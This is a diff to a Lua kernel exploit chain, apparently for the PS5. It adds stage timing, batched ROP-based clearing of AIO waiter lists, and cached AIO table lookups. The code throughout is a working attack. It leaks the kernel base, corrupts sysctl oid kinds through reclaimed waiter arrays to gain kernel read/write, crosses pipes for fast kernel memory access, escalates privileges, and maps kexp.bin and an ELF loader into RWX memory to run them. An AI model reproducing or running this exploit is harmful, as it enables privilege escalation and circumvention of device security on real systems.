@@ -1,4 +1,4 @@
--- relapse_combined.lua
+--!lua
 
 -- =====================================================================
 -- relapse_offsets.lua
@@ -1585,7 +1585,19 @@ local function patch_imports(ctx, entry_addr, size)
 end
 
 local function launch(ctx)
+    local function profile_start()
+        if ctx.profile_start then return ctx.profile_start() end
+        return nil, nil
+    end
+    local function profile_stop(name, start_sec, start_nsec)
+        if ctx.profile_stop and start_sec ~= nil then
+            ctx.profile_stop(name, start_sec, start_nsec)
+        end
+    end
+
+    local profile_sec, profile_nsec = profile_start()
     ctx.restore_thread_attributes()
+    profile_stop("shellcode_restore_thread_attrs", profile_sec, profile_nsec)
 
     if not ctx.kbase or not ctx.proc_fd_addr then
         ctx.report("Kernel", "kernel r/w is incomplete")
@@ -1598,28 +1610,40 @@ local function launch(ctx)
         return false
     end
 
+    profile_sec, profile_nsec = profile_start()
     local elfldr_path = find_payload_file("@@ELFLDR_FILE@@", "elfldr-ps5.elf")
+    profile_stop("shellcode_find_elfldr", profile_sec, profile_nsec)
     if not elfldr_path then
         ctx.report("Kernel", "elfldr payload not found")
         return false
     end
+    profile_sec, profile_nsec = profile_start()
     local elfldr_data = read_payload_file(elfldr_path)
+    profile_stop("shellcode_read_elfldr", profile_sec, profile_nsec)
     if not elfldr_data then
         ctx.report("Kernel", elfldr_path .. " could not be read")
         return false
     end
+    profile_sec, profile_nsec = profile_start()
     local elfldr_ptr = lua.resolve_value(elfldr_data)
+    profile_stop("shellcode_resolve_elfldr", profile_sec, profile_nsec)
 
+    profile_sec, profile_nsec = profile_start()
     local kexp_path = find_payload_file("@@KEXP_FILE@@", "kexp.bin")
+    profile_stop("shellcode_find_kexp", profile_sec, profile_nsec)
     if not kexp_path then
         ctx.report("Kernel", "kexp binary not found")
         return false
     end
+    profile_sec, profile_nsec = profile_start()
     local kexp_data = read_payload_file(kexp_path)
+    profile_stop("shellcode_read_kexp", profile_sec, profile_nsec)
     if not kexp_data then
         ctx.report("Kernel", kexp_path .. " could not be read")
         return false
     end
+
+    profile_sec, profile_nsec = profile_start()
     local kexp_aligned_size = align_to(#kexp_data, PAGE_SIZE)
 
     local exec_fd = syscall.jitshm_create(0, kexp_aligned_size, ctx.prot_rwx):tonumber()
@@ -1636,9 +1660,12 @@ local function launch(ctx)
     end
 
     if not patch_imports(ctx, entry_addr, #kexp_data) then
+        profile_stop("shellcode_map_copy_patch", profile_sec, profile_nsec)
         return false
     end
+    profile_stop("shellcode_map_copy_patch", profile_sec, profile_nsec)
 
+    profile_sec, profile_nsec = profile_start()
     local args = memory.alloc(0x40)
     for i = 0, 0x38, 8 do
         memory.write_qword(args + i, 0)
@@ -1674,14 +1701,19 @@ local function launch(ctx)
     memory.write_dword(args + 0x28, 0x4B585032)
     memory.write_dword(args + 0x2c, 12)
     memory.write_qword(args + 0x30, api_table)
+    profile_stop("shellcode_args_api_setup", profile_sec, profile_nsec)
 
+    profile_sec, profile_nsec = profile_start()
     local pthread_create = fcall(libkernel_addrofs.pthread_create_name_np)
     local pthread_join = fcall(libkernel_addrofs.pthread_join)
+    profile_stop("shellcode_prepare_thread_calls", profile_sec, profile_nsec)
 
     local spawn_err
     run_with_coroutine(function()
         local thr_handle_addr = memory.alloc(8)
+        local create_sec, create_nsec = profile_start()
         local created = pthread_create(thr_handle_addr, 0, entry_addr, args, "kexp"):tonumber()
+        profile_stop("shellcode_thread_create", create_sec, create_nsec)
         if created ~= 0 then
             spawn_err = "pthread_create returned " .. ctx.hex(created)
             return
@@ -1690,7 +1722,9 @@ local function launch(ctx)
         ctx.on_handoff()
 
         local result_addr = memory.alloc(8)
+        local join_sec, join_nsec = profile_start()
         local joined = pthread_join(thr_handle, result_addr):tonumber()
+        profile_stop("shellcode_thread_join", join_sec, join_nsec)
         if joined ~= 0 then
             spawn_err = "pthread_join returned " .. ctx.hex(joined)
             return
@@ -1758,6 +1792,7 @@ syscall.resolve({
     aio_multi_wait = 0x297,
     aio_multi_poll = 0x298,
     aio_multi_cancel = 0x29A,
+    clock_gettime = 0xE8,
     aio_submit_cmd = 0x29D,
 })
 
@@ -1788,6 +1823,11 @@ local allowed_mask
 local thread_attrs_restored = false
 local scratch_states = memory.alloc(0x400)
 local scratch_qword = memory.alloc(8)
+local scratch_group = memory.alloc(0x60)
+
+local fast_poll_profile = { scans = 0, calls = 0, ids = 0, rounds = 0, elapsed = 0, clock_errors = 0 }
+local fast_poll_profile_timer = memory.alloc(16)
+local fast_stage_profile = {}
 
 local tuning = {
     waiters = 18,
@@ -1837,6 +1877,28 @@ sysint = function(fn, ...)
     local v = ret.l
     if v >= 0x80000000 then v = v - 0x100000000 end
     return v
+end
+
+local function fast_poll_now()
+    if sysint(syscall.clock_gettime, 4, fast_poll_profile_timer) ~= 0 then
+        return nil, nil
+    end
+    return memory.read_qword(fast_poll_profile_timer):tonumber(),
+        memory.read_qword(fast_poll_profile_timer + 8):tonumber()
+end
+
+local function fast_stage_start()
+    return fast_poll_now()
+end
+
+local function fast_stage_stop(name, start_sec, start_nsec)
+    local end_sec, end_nsec = fast_poll_now()
+    if not start_sec or not end_sec then
+        fast_poll_profile.clock_errors = fast_poll_profile.clock_errors + 1
+        return
+    end
+    local elapsed = (end_sec - start_sec) + (end_nsec - start_nsec) / 1000000000
+    if elapsed >= 0 then fast_stage_profile[name] = (fast_stage_profile[name] or 0) + elapsed end
 end
 
 to_int32 = function(v)
@@ -2144,25 +2206,63 @@ park_aio_workers = function(limit)
 end
 
 wait_for_pending_requests = function(candidate_ids, candidate_count, wanted_count)
-    local poll_id = memory.alloc(4)
-    local poll_state = memory.alloc(4)
+    local poll_limit = 16
+    local poll_ids = memory.alloc(4 * candidate_count + 8)
+    local poll_states = memory.alloc(4 * candidate_count + 8)
+    local active_indices = {}
     local pending_indices = {}
     local seen = {}
+    local passes, poll_calls, polled_ids = 0, 0, 0
+    local started_sec, started_nsec = fast_poll_now()
+    if not started_sec then fast_poll_profile.clock_errors = fast_poll_profile.clock_errors + 1 end
 
     for attempt = 1, 150 do
         if #pending_indices >= wanted_count then break end
+        passes = attempt
+
+        -- Preserve selection order and avoid selecting a pending request twice.
+        local active_count = 0
         for index = 0, candidate_count - 1 do
-            if #pending_indices >= wanted_count then break end
             if not seen[index] then
-                memory.write_dword(poll_id, memory.read_dword(candidate_ids + index * 4))
-                sysint(syscall.aio_multi_poll, poll_id, 1, poll_state)
-                if bit32.band(memory.read_dword(poll_state):tonumber(), 0xffff) == 1 then
-                    table.insert(pending_indices, index)
-                    seen[index] = true
-                end
+                memory.write_dword(poll_ids + active_count * 4,
+                    memory.read_dword(candidate_ids + index * 4))
+                active_indices[active_count + 1] = index
+                active_count = active_count + 1
             end
         end
+
+        local offset = 0
+        while offset < active_count and #pending_indices < wanted_count do
+            local batch_count = math.min(poll_limit, active_count - offset)
+            sysint(syscall.aio_multi_poll, poll_ids + offset * 4, batch_count, poll_states)
+            poll_calls = poll_calls + 1
+            polled_ids = polled_ids + batch_count
+
+            for slot = 0, batch_count - 1 do
+                local index = active_indices[offset + slot + 1]
+                local state = bit32.band(
+                    memory.read_dword(poll_states + slot * 4):tonumber(), 0xffff)
+                if state == 1 then
+                    table.insert(pending_indices, index)
+                    seen[index] = true
+                    if #pending_indices >= wanted_count then break end
+                end
+            end
+            offset = offset + batch_count
+        end
+
         if #pending_indices < wanted_count then sleep(20, "ms") end
+    end
+
+    fast_poll_profile.scans = fast_poll_profile.scans + 1
+    fast_poll_profile.calls = fast_poll_profile.calls + poll_calls
+    fast_poll_profile.ids = fast_poll_profile.ids + polled_ids
+    fast_poll_profile.rounds = fast_poll_profile.rounds + passes
+    local ended_sec, ended_nsec = fast_poll_now()
+    if not ended_sec then fast_poll_profile.clock_errors = fast_poll_profile.clock_errors + 1 end
+    if started_sec and ended_sec then
+        local elapsed = (ended_sec - started_sec) + (ended_nsec - started_nsec) / 1000000000
+        if elapsed >= 0 then fast_poll_profile.elapsed = fast_poll_profile.elapsed + elapsed end
     end
 
     if #pending_indices ~= wanted_count then
@@ -2213,6 +2313,7 @@ remember_armed_group = function(group)
 end
 
 run_reclaim_batch = function(group, nodes)
+    local started_sec, started_nsec = fast_stage_start()
     local requests = tuning.requests
     local request_size = off.aio.requestSize
     local sprayed_ids = memory.alloc(4 * requests * (tuning.sprays + 1))
@@ -2220,12 +2321,16 @@ run_reclaim_batch = function(group, nodes)
     memory.write_dword(timeout, tuning.waitTimeoutUs)
 
     local churn_request = bit32.bor(0x80000000, bit32.lshift(requests * request_size, 16), 0x4101)
+    fast_stage_stop("reclaim_setup", started_sec, started_nsec)
 
+    started_sec, started_nsec = fast_stage_start()
     local preflight = sysint(syscall.ioctl, -1, churn_request, nodes)
+    fast_stage_stop("reclaim_preflight", started_sec, started_nsec)
     if preflight ~= -1 then return nil end
 
 -- this chain needs a larger rop stack than the 0x2000-byte default.
-    local chain = ropchain({ stack_size = 0x30000 })
+    started_sec, started_nsec = fast_stage_start()
+    local chain = ropchain({ stack_size = 0x30000, ops_only = true })
     for i = 1, tuning.churnBefore do
         chain:push_syscall(syscall.ioctl, -1, churn_request, nodes)
     end
@@ -2242,14 +2347,22 @@ run_reclaim_batch = function(group, nodes)
     end
 
     chain:restore_through_longjmp()
-    chain:execute_through_coroutine()
+    fast_stage_stop("reclaim_chain_build", started_sec, started_nsec)
 
+    started_sec, started_nsec = fast_stage_start()
+    chain:execute_through_coroutine()
+    fast_stage_stop("reclaim_chain_execute", started_sec, started_nsec)
+
+    started_sec, started_nsec = fast_stage_start()
     local accepted = 0
     for i = 1, tuning.sprays do
         if memory.read_dword(chain.retval_addr[i]):tonumber() == 0 then
             accepted = accepted + 1
         end
     end
+    fast_stage_stop("reclaim_result_check", started_sec, started_nsec)
+    fast_stage_profile.reclaim_chain_ops = (fast_stage_profile.reclaim_chain_ops or 0)
+        + tuning.churnBefore + 1 + tuning.churnAfter + tuning.sprays
     return accepted
 end
 
@@ -2271,11 +2384,15 @@ first_pending_request = function(group)
 end
 
 reclaim_waiter_array = function(tag, first_target, second_target)
+    local started_sec, started_nsec = fast_stage_start()
     local group = claim_pending_requests(tuning.waiters)
+    fast_stage_stop("reclaim_claim", started_sec, started_nsec)
     remember_armed_group(group)
 
     local nodes = build_waiter_nodes(tuning.requests, first_target, second_target)
+    started_sec, started_nsec = fast_stage_start()
     local accepted = run_reclaim_batch(group, nodes)
+    fast_stage_stop("reclaim_batch", started_sec, started_nsec)
     if accepted == nil then
         report(tag, "invalid churn request")
         return nil
@@ -2285,7 +2402,9 @@ reclaim_waiter_array = function(tag, first_target, second_target)
         return nil
     end
 
+    started_sec, started_nsec = fast_stage_start()
     local first_pending = first_pending_request(group)
+    fast_stage_stop("reclaim_first_pending", started_sec, started_nsec)
     if first_pending < 0 then
         report(tag, "no pending request is available")
         return nil
@@ -2295,22 +2414,29 @@ reclaim_waiter_array = function(tag, first_target, second_target)
 end
 
 flip_oid_kind = function(tag, reclaim, mib, target)
+    local started_sec, started_nsec = fast_stage_start()
     local kind = oid_kind(mib)
     if kind == nil then
+        fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
         report(tag, "oid is hidden before the flip")
         return false
     end
 
-    local i = 0
+    local i, cancel_count = 0, 0
     while i < reclaim.heads and kind ~= target do
         cancel_request(reclaim.group, i)
+        cancel_count = cancel_count + 1
         local next_kind = oid_kind(mib)
         if next_kind == nil then
+            fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
+            fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
             report(tag, "oid disappeared during the flip")
             return false
         end
         kind = next_kind
         if bit32.band(bit32.rshift(kind, 24), 0xff) < bit32.band(bit32.rshift(target, 24), 0xff) then
+            fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
+            fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
             report(tag, "oid flip overshot into oid_arg1")
             return false
         end
@@ -2319,8 +2445,12 @@ flip_oid_kind = function(tag, reclaim, mib, target)
 
     if kind ~= target then
         report(tag, "not enough waiter heads")
+        fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
+        fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
         return false
     end
+    fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
+    fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
     return true
 end
 
@@ -2470,16 +2600,43 @@ arm_kernel_read_write = function()
         return false
     end
 
+    local started_sec, started_nsec = fast_stage_start()
     raise_fd_limit()
+    fast_stage_stop("raise_fd_limit", started_sec, started_nsec)
+
+    started_sec, started_nsec = fast_stage_start()
     park_aio_workers(tuning.workerBlockers)
+    fast_stage_stop("park_aio_workers", started_sec, started_nsec)
 
-    if not make_oid_writable("arm a", mib_a, a.kindByte3) then return false end
-    if not steer_oid_window() then return false end
-    if not test_kernel_read() then return false end
-    if not make_oid_writable("arm c", mib_b, b.kindByte3) then return false end
-    if not test_kernel_write() then return false end
+    started_sec, started_nsec = fast_stage_start()
+    local writable_a = make_oid_writable("arm a", mib_a, a.kindByte3)
+    fast_stage_stop("make_oid_writable_a", started_sec, started_nsec)
+    if not writable_a then return false end
 
-    return prepare_high_writer()
+    started_sec, started_nsec = fast_stage_start()
+    local steered = steer_oid_window()
+    fast_stage_stop("steer_oid_window", started_sec, started_nsec)
+    if not steered then return false end
+
+    started_sec, started_nsec = fast_stage_start()
+    local read_ok = test_kernel_read()
+    fast_stage_stop("test_kernel_read", started_sec, started_nsec)
+    if not read_ok then return false end
+
+    started_sec, started_nsec = fast_stage_start()
+    local writable_c = make_oid_writable("arm c", mib_b, b.kindByte3)
+    fast_stage_stop("make_oid_writable_c", started_sec, started_nsec)
+    if not writable_c then return false end
+
+    started_sec, started_nsec = fast_stage_start()
+    local write_ok = test_kernel_write()
+    fast_stage_stop("test_kernel_write", started_sec, started_nsec)
+    if not write_ok then return false end
+
+    started_sec, started_nsec = fast_stage_start()
+    local writer_ready = prepare_high_writer()
+    fast_stage_stop("prepare_high_writer", started_sec, started_nsec)
+    return writer_ready
 end
 
 -- process discovery
@@ -2833,11 +2990,138 @@ local function group_read64(address)
     return -1, uint64(0)
 end
 
+local function group_read_block(address, length, dest)
+    if length % 4 ~= 0 then return -1 end
+    if crossed then
+        if kread_fast(address, length, dest) == length then return 0 end
+        return -1
+    end
+    for offset = 0, length - 1, 4 do
+        local rv, value = kread32(address + offset)
+        if rv ~= 0 then return -1 end
+        memory.write_dword(dest + offset, value)
+    end
+    return 0
+end
+
 local function group_write32(address, value)
     if not crossed then return kwrite32(address, value) end
     memory.write_dword(scratch_qword, bit32.band(value, 0xffffffff))
     if kwrite_fast(address, 4, scratch_qword) == 4 then return 0 end
     return -1
+end
+
+local function group_write64(address, value)
+    if not crossed then return kwrite64(address, value) end
+    memory.write_qword(scratch_qword, value)
+    if kwrite_fast(address, 8, scratch_qword) == 8 then return 0 end
+    return -1
+end
+
+local function clear_aio_waiters_batch(candidates)
+    local count = #candidates
+    if count == 0 then return 0, 0 end
+
+    local function clear_one(shared)
+        local ok = false
+        for attempt = 1, 3 do
+            if ok then break end
+            group_write64(shared + off.aio.group.waiters, uint64(0))
+            local _, back = group_read64(shared + off.aio.group.waiters)
+            ok = back.l == 0 and back.h == 0
+        end
+        return ok
+    end
+    local function clear_individually()
+        local cleared, failed = 0, 0
+        fast_stage_profile.aio_clear_fallback_ids =
+            (fast_stage_profile.aio_clear_fallback_ids or 0) + count
+        for _, shared in ipairs(candidates) do
+            if clear_one(shared) then cleared = cleared + 1 else failed = failed + 1 end
+        end
+        return cleared, failed
+    end
+
+    -- Batch pipe retargeting and I/O only for the supported pipe layout.
+    if off.pipe.count ~= 0 or off.pipe.size ~= 0x0c or off.pipe.buffer ~= 0x10 then
+        return clear_individually()
+    end
+
+    local chain = ropchain({ stack_size = 0x30000, ops_only = true })
+    if not chain.ops_only then
+        return clear_individually()
+    end
+
+    local result_buffer = memory.alloc(count * 6 * 8)
+    local verify_buffer = memory.alloc(count * 8)
+    local result_index = 0
+    local function push_syscall_result(number, ...)
+        chain:push_syscall(number, ...)
+        chain.ops[#chain.ops].ret_addr = result_buffer + result_index * 8
+        result_index = result_index + 1
+    end
+    local function queue_aim(shared, length)
+        chain:push_write_qword_memory(aim_buffer, uint64(length))
+        chain:push_write_qword_memory(aim_buffer + 8, uint64(pipe_size) << 32)
+        chain:push_write_qword_memory(aim_buffer + off.pipe.buffer, shared)
+        push_syscall_result(syscall.write, master.write_fd, aim_buffer, 0x18)
+        push_syscall_result(syscall.read, master.read_fd, drain_buffer, 0x18)
+    end
+
+    for index, shared in ipairs(candidates) do
+        local waiter_addr = shared + off.aio.group.waiters
+        queue_aim(waiter_addr, 0)
+        chain:push_write_qword_memory(scratch_qword, uint64(0))
+        push_syscall_result(syscall.write, victim.write_fd, scratch_qword, 8)
+
+        queue_aim(waiter_addr, 8)
+        push_syscall_result(syscall.read, victim.read_fd, verify_buffer + (index - 1) * 8, 8)
+    end
+
+    local ran = pcall(function() chain:execute_through_coroutine() end)
+    fast_stage_profile.aio_clear_batches = (fast_stage_profile.aio_clear_batches or 0) + 1
+    fast_stage_profile.aio_clear_batch_ids = (fast_stage_profile.aio_clear_batch_ids or 0) + count
+
+    local results, verify = nil, nil
+    if ran then
+        results = memory.read_buffer(result_buffer, count * 6 * 8)
+        verify = memory.read_buffer(verify_buffer, count * 8)
+    end
+
+    local function read_u32_le(data, offset)
+        local b1, b2, b3, b4 = string.byte(data, offset, offset + 3)
+        if not b4 then return nil end
+        return b1 | (b2 << 8) | (b3 << 16) | (b4 << 24)
+    end
+    local function result_is(data, slot, expected)
+        local offset = (slot - 1) * 8 + 1
+        return read_u32_le(data, offset) == expected and read_u32_le(data, offset + 4) == 0
+    end
+
+    local cleared, failed = 0, 0
+    for index, shared in ipairs(candidates) do
+        local base = (index - 1) * 6
+        local verified = results ~= nil
+            and result_is(results, base + 1, 0x18)
+            and result_is(results, base + 2, 0x18)
+            and result_is(results, base + 3, 8)
+            and result_is(results, base + 4, 0x18)
+            and result_is(results, base + 5, 0x18)
+            and result_is(results, base + 6, 8)
+        if verified then
+            local read_offset = (index - 1) * 8 + 1
+            verified = read_u32_le(verify, read_offset) == 0
+                and read_u32_le(verify, read_offset + 4) == 0
+        end
+        if verified then
+            cleared = cleared + 1
+        else
+            fast_stage_profile.aio_clear_fallback_ids =
+                (fast_stage_profile.aio_clear_fallback_ids or 0) + 1
+            if clear_one(shared) then cleared = cleared + 1 else failed = failed + 1 end
+        end
+    end
+    return cleared, failed
 end
 
 local function group_read_pointer(address)
@@ -2846,32 +3130,74 @@ local function group_read_pointer(address)
     return nil
 end
 
-lookup_aio_group = function(table_addr, id)
+lookup_aio_group = function(table_addr, id, page_count, page_cache, slot_scratch)
     local id_table = off.aio.idTable
     local index = bit32.band(id, 0x1fff)
 
-    local page_count_rv, page_count = group_read32(table_addr + id_table.pages)
-    if page_count_rv ~= 0 or page_count == 0 or page_count > 64 then return nil end
+    if page_count == nil then
+        local page_count_rv
+        page_count_rv, page_count = group_read32(table_addr + id_table.pages)
+        if page_count_rv ~= 0 then return nil end
+    end
+    if page_count == 0 or page_count > 64 then return nil end
     if index >= bit32.lshift(page_count, 7) then return nil end
 
-    local page = group_read_pointer(table_addr + bit32.rshift(index, 7) * 8)
+    local page_index = bit32.rshift(index, 7)
+    local page_entry = page_cache and page_cache[page_index]
+    local page = page_entry and page_entry.address
+    if not page_entry then
+        page = group_read_pointer(table_addr + page_index * 8)
+        if page then
+            page_entry = { address = page }
+            if crossed then
+                local image = memory.alloc(128 * id_table.slotStride)
+                if group_read_block(page, 128 * id_table.slotStride, image) == 0 then
+                    page_entry.image = image
+                    fast_stage_profile.aio_page_snapshots = (fast_stage_profile.aio_page_snapshots or 0) + 1
+                else
+                    fast_stage_profile.aio_page_fallbacks = (fast_stage_profile.aio_page_fallbacks or 0) + 1
+                end
+            end
+            if page_cache then page_cache[page_index] = page_entry end
+        end
+    end
     if not page then return nil end
 
-    local slot = page + bit32.band(id, 0x7f) * id_table.slotStride
+    local slot_index = bit32.band(id, 0x7f)
+    local slot = page + slot_index * id_table.slotStride
+    local group, entry_type, state, generation
+    if crossed then
+        local fields = slot_scratch or scratch_group
+        if page_entry.image then
+            fields = page_entry.image + slot_index * id_table.slotStride + 0x10
+            fast_stage_profile.aio_cached_slots = (fast_stage_profile.aio_cached_slots or 0) + 1
+        elseif group_read_block(slot + 0x10, 0x1c, fields) ~= 0 then
+            return nil
+        end
+        group = memory.read_qword(fields)
+        entry_type = memory.read_dword(fields + 0x10):tonumber()
+        state = memory.read_dword(fields + 0x14):tonumber()
+        generation = memory.read_dword(fields + 0x18):tonumber()
+    else
+        local generation_rv
+        generation_rv, generation = group_read32(slot + 0x28)
+        if generation_rv ~= 0 then return nil end
+        local state_rv
+        state_rv, state = group_read32(slot + 0x24)
+        if state_rv ~= 0 then return nil end
+        local type_rv
+        type_rv, entry_type = group_read32(slot + 0x20)
+        if type_rv ~= 0 then return nil end
+        group = group_read_pointer(slot + 0x10)
+    end
 
-    local gen_rv, generation = group_read32(slot + 0x28)
-    if gen_rv ~= 0 then return nil end
     if bit32.band(bit32.bor(bit32.lshift(bit32.band(generation, 0xffff), 13), index), 0xffff) ~= id then
         return nil
     end
-
-    local state_rv, state = group_read32(slot + 0x24)
-    if state_rv ~= 0 or bit32.rshift(state, 16) ~= 3 then return nil end
-
-    local type_rv, entry_type = group_read32(slot + 0x20)
-    if type_rv ~= 0 or bit32.band(entry_type, 0xffff) ~= id_table.entryType then return nil end
-
-    return group_read_pointer(slot + 0x10)
+    if bit32.rshift(state, 16) ~= 3 then return nil end
+    if bit32.band(entry_type, 0xffff) ~= id_table.entryType then return nil end
+    if not is_kernel_pointer(group) then return nil end
+    return group
 end
 
 defuse_aio_groups = function()
@@ -2888,12 +3214,18 @@ defuse_aio_groups = function()
 
     local num_off, state_off, waiters_off = off.aio.group.num, off.aio.group.state, off.aio.group.waiters
     local total, already_clear, cleared, skipped, failed = 0, 0, 0, 0, 0
+    local pending_clears = {}
+    local page_count_rv, cached_page_count = group_read32(table_addr + off.aio.idTable.pages)
+    if page_count_rv ~= 0 or cached_page_count == 0 or cached_page_count > 64 then
+        cached_page_count = nil
+    end
+    local page_cache = {}
 
     for _, ids in ipairs(armed_groups) do
         for _, id in ipairs(ids) do
             total = total + 1
 
-            local group = lookup_aio_group(table_addr, id)
+            local group = lookup_aio_group(table_addr, id, cached_page_count, page_cache, scratch_group)
             if not group then
                 skipped = skipped + 1
             else
@@ -2901,24 +3233,35 @@ defuse_aio_groups = function()
                 if not shared then
                     skipped = skipped + 1
                 else
-                    local _, group_num = group_read32(shared + num_off)
-                    local _, group_state = group_read32(shared + state_off)
-                    if group_num ~= 1 or group_state < 1 or group_state > 4 then
-                        skipped = skipped + 1
+                    local group_num, group_state, head
+                    local fields_ok = true
+                    if crossed then
+                        fields_ok = group_read_block(shared, waiters_off + 8, scratch_group) == 0
+                        if fields_ok then
+                            group_num = memory.read_dword(scratch_group + num_off):tonumber()
+                            group_state = memory.read_dword(scratch_group + state_off):tonumber()
+                            head = memory.read_qword(scratch_group + waiters_off)
+                        end
                     else
-                        local _, head = group_read64(shared + waiters_off)
-                        if head.l == 0 and head.h == 0 then
-                            already_clear = already_clear + 1
-                        else
-                            local ok = false
-                            for attempt = 1, 3 do
-                                if ok then break end
-                                group_write32(shared + waiters_off, 0)
-                                group_write32(shared + waiters_off + 4, 0)
-                                local _, back = group_read64(shared + waiters_off)
-                                ok = back.l == 0 and back.h == 0
-                            end
-                            if ok then cleared = cleared + 1 else failed = failed + 1 end
+                        local _
+                        _, group_num = group_read32(shared + num_off)
+                        _, group_state = group_read32(shared + state_off)
+                        _, head = group_read64(shared + waiters_off)
+                    end
+
+                    if not fields_ok then
+                        skipped = skipped + 1
+                    elseif group_num ~= 1 or group_state < 1 or group_state > 4 then
+                        skipped = skipped + 1
+                    elseif head.l == 0 and head.h == 0 then
+                        already_clear = already_clear + 1
+                    else
+                        pending_clears[#pending_clears + 1] = shared
+                        if #pending_clears >= 8 then
+                            local batch_cleared, batch_failed = clear_aio_waiters_batch(pending_clears)
+                            cleared = cleared + batch_cleared
+                            failed = failed + batch_failed
+                            pending_clears = {}
                         end
                     end
                 end
@@ -2926,8 +3269,18 @@ defuse_aio_groups = function()
         end
     end
 
+    if #pending_clears > 0 then
+        local batch_cleared, batch_failed = clear_aio_waiters_batch(pending_clears)
+        cleared = cleared + batch_cleared
+        failed = failed + batch_failed
+    end
+
     local ok = skipped == 0 and failed == 0 and (cleared + already_clear) == total
     defused = true
+    fast_stage_profile.aio_cleanup_counts = {
+        total = total, cleared = cleared, already_clear = already_clear,
+        skipped = skipped, failed = failed,
+    }
     if not ok then
         report("cleanup", string.format("aio cleanup failed (%d skipped, %d failed)", skipped, failed))
     end
@@ -2954,6 +3307,8 @@ launch_shellcode = function()
         libc_handle = LIBC_HANDLE,
         kread_fast = kread_fast,
         kwrite_fast = kwrite_fast,
+        profile_start = fast_stage_start,
+        profile_stop = fast_stage_stop,
         on_handoff = function() handed_off = true end,
     })
 end
@@ -3108,27 +3463,53 @@ run = function()
     stage("Starting kernel exploit")
 
     local ok, result = pcall(function()
+        local started_sec, started_nsec = fast_stage_start()
         leak_kernel_base()
+        fast_stage_stop("leak_kernel_base", started_sec, started_nsec)
         ok_msg("kbase: " .. hex(kbase))
-        pin_to_single_core()
 
-        if not arm_kernel_read_write() then return stop("armings did not complete") end
+        started_sec, started_nsec = fast_stage_start()
+        pin_to_single_core()
+        fast_stage_stop("pin_to_single_core", started_sec, started_nsec)
+
+        started_sec, started_nsec = fast_stage_start()
+        local rw_ready = arm_kernel_read_write()
+        fast_stage_stop("arm_kernel_read_write", started_sec, started_nsec)
+        if not rw_ready then return stop("armings did not complete") end
         stage("kernel r/w ready")
 
-        if not find_current_process() then return stop("curproc not found") end
-        if not locate_pipes() then return stop("pipes not located") end
+        started_sec, started_nsec = fast_stage_start()
+        local process_found = find_current_process()
+        fast_stage_stop("find_current_process", started_sec, started_nsec)
+        if not process_found then return stop("curproc not found") end
+
+        started_sec, started_nsec = fast_stage_start()
+        local pipes_found = locate_pipes()
+        fast_stage_stop("locate_pipes", started_sec, started_nsec)
+        if not pipes_found then return stop("pipes not located") end
         stage("pipes located")
-        if not cross_pipes() then return stop("fast read and write not established") end
+
+        started_sec, started_nsec = fast_stage_start()
+        local pipes_crossed = cross_pipes()
+        fast_stage_stop("cross_pipes", started_sec, started_nsec)
+        if not pipes_crossed then return stop("fast read and write not established") end
         stage("kernel fast r/w ready")
 
         stage("checking aio groups")
+        started_sec, started_nsec = fast_stage_start()
         defuse_aio_groups()
+        fast_stage_stop("defuse_aio_groups", started_sec, started_nsec)
 
         stage("checking privileges")
-        if not escalate() then return stop("escalation did not clear") end
+        started_sec, started_nsec = fast_stage_start()
+        local privileges_ready = escalate()
+        fast_stage_stop("escalate", started_sec, started_nsec)
+        if not privileges_ready then return stop("escalation did not clear") end
         stage("privileges ready")
 
+        started_sec, started_nsec = fast_stage_start()
         local payloads = launch_shellcode()
+        fast_stage_stop("launch_shellcode", started_sec, started_nsec)
         stage(payloads and "payloads loaded" or "finished")
         return { kbase = kbase, done = true, payloads = payloads }
     end)
